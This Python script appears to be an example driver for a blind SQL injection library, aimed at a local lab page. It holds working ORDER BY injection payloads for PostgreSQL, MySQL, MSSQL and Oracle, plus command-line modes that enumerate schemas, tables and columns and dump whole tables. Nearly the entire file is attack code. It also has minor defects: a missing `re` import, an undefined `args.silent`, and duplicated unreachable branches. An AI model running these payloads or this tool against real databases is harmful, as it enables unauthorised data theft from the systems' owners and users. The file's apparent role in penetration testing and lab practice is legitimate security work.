#!/usr/bin/env python

import sqli_blinder
import requests
import argparse
import logging

logging.basicConfig(level=logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.WARNING)

def postgre_analyze_func(text):
	if 'ugol' in text:
		return True
	else:
		return False

def mysql_analyze_func(text):
	if text.find('metal')<text.find('ugol'):
		return True
	else:
		return False

def mssql_analyze_func(text):
	regex = '(?=<tr>)'
	# print(regex)
	if len(re.findall(regex,text)) == 2:
		return True
	else:
		return False
	raise Exception('not correct answer')

def oracle_analyze_func(text):
	if 'ORA-' in text:
		return False
	else:
		return True

analyze_functions = {'mysql':mysql_analyze_func,
					'postgre':postgre_analyze_func,
					'mssql':mssql_analyze_func,
					'oracle':oracle_analyze_func}

def request_func(sql):
	"""this function must return True for sql=`1=1` and False for sql=`1=0`"""
	
	http_proxy   = "http://localhost:8080"
	proxyDict = { 
				 "https"   : http_proxy,	
				 "http"   : http_proxy
				}
	#comment this for proxy
	proxyDict = None
	target_db = 'postgre'

	burp0_url = "http://localhost:8888/blind_orderby.php"
	postgre_params = {"orderby":'(SELECT 1 order by 1/(case when (%s) then 1 else 0 end))' % sql, 'database':'postgre'}
	mysql_params = {"orderby":'if((%s),name,vendor)' % sql, 'database':'mysql'}
	mssql_params = {"orderby":"name offset (case when (%s) then 1 else 2 end) rows"%sql, 'database':'mssql'}
	oracle_params = {"orderby":"(CASE WHEN (%s) THEN 1786 ELSE 2*(SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)" %sql,'database':'oracle'}
	params = {'mysql': mysql_params, 'postgre':postgre_params, 'mssql':mssql_params,'oracle':oracle_params}
	r = requests.get(burp0_url, params=params[target_db],proxies=proxyDict)
	

	return analyze_functions[target_db](r.text)



def required(arg, mode):
	logging.error(f"argument {arg} is required for mode {mode}")
	exit(-1)


if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("mode",help="mode - one of ['check','count','one','get','schemata','tables','columns','dump']",
								choices= ['check','count','one','get','schemata','tables','columns','dump'])
	parser.add_argument("-s","--schema",
						help = "schema name");
	parser.add_argument("-t","--table",
						help = "table name");
	parser.add_argument("-c","--column", nargs='+',
						help="column names. For get mode could by comma separated array of columns")
	parser.add_argument("-w", "--where", 
						help="where clause")
	parser.add_argument('-i','--index',help='index of row')
	parser.add_argument("--threads",help="number of threads",type=int,default=16)
	parser.add_argument('--dbms',help="DBMS",choices= ['mysql','mssql','sqlite','oracle','postgre'])
	parser.add_argument("--order-by",help="order by column name or index")
	parser.add_argument("-v", "--verbose", help="disable logging debug",
						default=False, action="store_true")
	
	args = parser.parse_args()

	if args.threads <=0 :
		print ('threads > 0')
		exit(-1)
	if args.threads == 1:
		multithreaded = False
	else:
		multithreaded = True

	if args.mode == "check":
		if args.dbms is None:
			args.dbms = "sqlite"
		sqlib = sqli_blinder.SQLiBlinder(
			request_func, args.dbms, multithreaded=multithreaded, threads=args.threads)
		check = sqlib.check()
		logging.info(check)
		exit(0)

	sqlib = sqli_blinder.SQLiBlinder(
		request_func, args.dbms, multithreaded=multithreaded, threads=args.threads)

	if args.dbms is None:
		required("dbms", args.mode)

	if args.mode == "schemata":
		logging.info(sqlib.get_schemata())
		exit(0)

	if args.mode == "tables":
		logging.info(sqlib.get_tables(args.schema))

		exit(0)

	if args.table is None:
		required("table", args.mode)

	if args.verbose:
		logging.basicConfig(level=logging.INFO)

	if args.mode == "count":
		logging.info(sqlib.get_count(args.table, args.where))
		exit(0)
	elif args.mode == "one":
		if args.index is None:
			required("index", args.mode)
		if args.column is None:
			required("column", args.mode)
		logging.info(sqlib.get_string(args.table, args.column, int(args.index),
							   args.where, args.order_by))
		exit(0)
	elif args.mode == "get":
		if args.column is None:
			required("column", args.mode)
		logging.info(sqlib.get(args.column, args.table, args.where,
						args.order_by))
		exit(0)
	elif args.mode == "columns":
		logging.info(sqlib.get_columns(args.table))
		exit(0)
	elif args.mode == "dump":
		columns = sqlib.get_columns(args.table)
		if columns is None:
			logging.info("No columns extracted, exiting")
			exit(-1)
		logging.info(f"columns: {columns}")
		logging.info(sqlib.get(columns, args.table, args.where,
						args.order_by))
		exit(0)
	elif args.mode == 'columns':
		print (sqlib.get_columns(args.table))
		exit(0)
	elif args.mode == 'dump':
		columns = sqlib.get_columns(args.table)
		if columns is None:
			print ('No columns extracted, exiting')
			exit (-1)
		print ('columns: ',columns)
		print (sqlib.get(columns,args.table,args.where,
						 args.order_by,verbose = not args.silent))
		exit(0)

